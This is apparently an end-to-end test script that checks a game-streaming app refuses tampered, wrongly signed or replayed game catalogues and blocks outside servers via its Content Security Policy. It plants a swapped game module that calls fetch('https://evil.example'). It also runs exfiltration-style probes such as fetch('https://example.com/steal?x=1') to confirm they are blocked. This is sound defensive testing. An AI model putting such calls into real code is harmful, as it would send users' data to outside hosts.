// End-to-end check of the signed catalogue: builds the streaming app with a throwaway key, serves the
// games from a local "games host", and checks that
//   1. games stream in from a correctly signed catalogue,
//   2. a game file swapped on the host is refused (and the other games still play),
//   3. a catalogue with a changed game list but the old signature is refused,
//   4. a catalogue signed by another key is refused,
//   5. an older (replayed) signed catalogue is refused,
//   6. the app's Content Security Policy blocks calls to any other server.
// Usage: node scripts/catalogue-test.mjs   (needs Playwright; uses ports 4191 and 4192)
import { generateKeyPairSync, sign } from 'node:crypto';
import { createServer } from 'node:http';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, readFileSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve, normalize } from 'node:path';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const { chromium } = require('playwright');
const ROOT = resolve(import.meta.dirname, '..'), tmp = mkdtempSync(join(tmpdir(), 'gs-cat-'));
const GAMES = join(tmp, 'games-host'), APP = join(tmp, 'app');
const pair = () => generateKeyPairSync('ec', { namedCurve: 'P-256' });
const good = pair(), other = pair();
const pub = good.publicKey.export({ type: 'spki', format: 'der' }).toString('base64');
const envelope = (data, key = good.privateKey) => JSON.stringify({ v: 2, data, sig: sign('sha256', Buffer.from(data), { key, dsaEncoding: 'ieee-p1363' }).toString('base64') });

// Build the games and sign them the way CI does.
execFileSync('node', ['scripts/build-games.mjs', GAMES], { cwd: ROOT, stdio: 'inherit' });
execFileSync('node', ['scripts/sign-catalogue.mjs', GAMES], { cwd: ROOT, stdio: 'inherit',
  env: { ...process.env, CATALOGUE_SIGNING_KEY: good.privateKey.export({ type: 'pkcs8', format: 'pem' }), EXPECT_PUBKEY: pub } });
const data = readFileSync(join(GAMES, 'manifest.json'), 'utf8'), m = JSON.parse(data);

// Build the streaming app pointed at the local games host, with the test public key.
execFileSync('npx', ['vite', 'build', '--outDir', APP, '--emptyOutDir'], { cwd: ROOT, stdio: 'inherit',
  env: { ...process.env, VITE_GAMES_URL: 'http://localhost:4192', VITE_CATALOGUE_KEY: pub, VITE_HEARTS_URL: '' } });

// The games host. `served` overrides files for a scenario.
let served = {};
const host = createServer((req, res) => {
  const path = normalize(decodeURIComponent(req.url.split('?')[0])).replace(/^\/+/, '');
  const body = served[path] ?? (existsSync(join(GAMES, path)) && !path.includes('..') ? readFileSync(join(GAMES, path)) : null);
  res.writeHead(body == null ? 404 : 200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': path.endsWith('.json') ? 'application/json' : 'text/javascript' });
  res.end(body ?? 'not found');
}).listen(4192);
const appServer = createServer((req, res) => {
  let path = normalize(decodeURIComponent(req.url.split('?')[0])).replace(/^\/+/, '') || 'index.html';
  const f = join(APP, path), ok = !path.includes('..') && existsSync(f) && !f.endsWith('/');
  const type = { js: 'text/javascript', css: 'text/css', html: 'text/html', json: 'application/json', svg: 'image/svg+xml', woff2: 'font/woff2', png: 'image/png' }[f.split('.').pop()] || 'application/octet-stream';
  res.writeHead(ok ? 200 : 404, { 'Content-Type': type }); res.end(ok ? readFileSync(f) : '');
}).listen(4191);

const b = await chromium.launch();
let fails = 0;
const check = (ok, label) => { if (!ok) fails++; console.log(ok ? 'PASS' : 'FAIL', label); };
// A fresh phone (empty storage) opens the app with the host serving `files`.
async function open(files = {}, keepPage) {
  served = files;
  const page = keepPage || await (await b.newContext({ viewport: { width: 390, height: 844 } })).newPage();
  if (!keepPage) await page.goto('http://localhost:4191/'); else await page.reload();
  await page.waitForTimeout(2500);
  return page;
}
const status = p => p.evaluate(() => __gs.remote.status());
const victim = m.games[0];

// 1. signed catalogue works
let p = await open();
let st = await status(p);
check(st.signed && st.games === m.games.length && st.loaded.length > 0, `signed catalogue: ${st.games}/${m.games.length} games listed, ${st.loaded.length} downloaded`);
await p.context().close();

// 2. a swapped game file is refused, the rest still play
p = await open({ [victim.file]: 'module.exports.default={id:' + JSON.stringify(victim.id) + ',make(){fetch("https://evil.example")}}' });
const r2 = await p.evaluate(id => __gs.remote.load(id), victim.id);
st = await status(p);
check(r2 === null && st.loaded.length > 0 && !st.loaded.includes(victim.id), `swapped game file refused (${victim.id}); ${st.loaded.length} other games loaded`);
await p.context().close();

// 3. changed list, old signature
const evil = JSON.parse(data); evil.games[0].sha256 = '0'.repeat(64);
const sig = JSON.parse(readFileSync(join(GAMES, 'catalogue.json'), 'utf8')).sig;
p = await open({ 'catalogue.json': JSON.stringify({ v: 2, data: JSON.stringify(evil), sig }) });
st = await status(p);
check(st.games === 0, `edited catalogue with the old signature refused (${st.games} games listed)`);
await p.context().close();

// 4. signed by someone else's key
p = await open({ 'catalogue.json': envelope(JSON.stringify(evil), other.privateKey) });
st = await status(p);
check(st.games === 0, `catalogue signed with another key refused (${st.games} games listed)`);
await p.context().close();

// 5. replay: the phone has the current catalogue, the host now serves an older signed one missing a game
p = await open();
const old = JSON.parse(data); old.built -= 86400000; old.games = old.games.slice(1);
served = { 'catalogue.json': envelope(JSON.stringify(old)) };
const took = await p.evaluate(() => __gs.remote.refresh());
st = await status(p);
check(!took && st.games === m.games.length, `older signed catalogue refused (${st.games} games still listed)`);
await p.context().close();

// 6. network block: code running in the app (as a game does) can't reach another server
p = await open();
const net = await p.evaluate(async () => {
  let violations = 0; document.addEventListener('securitypolicyviolation', () => violations++);
  const tryIt = f => f().then(() => 'reached', () => 'blocked');
  const out = { fetch: await tryIt(() => fetch('https://example.com/steal?x=1')) };
  try { new WebSocket('wss://example.com'); } catch (_) {}
  const img = new Image(); img.src = 'https://example.com/pixel.gif';
  out.ours = await tryIt(() => fetch('http://localhost:4192/manifest.json'));
  await new Promise(r => setTimeout(r, 500));
  return { ...out, violations };
});
check(net.fetch === 'blocked' && net.ours === 'reached' && net.violations >= 3, `other servers blocked, games host allowed (${JSON.stringify(net)})`);
await p.context().close();

await b.close(); host.close(); appServer.close();
process.exit(fails ? 1 : 0);
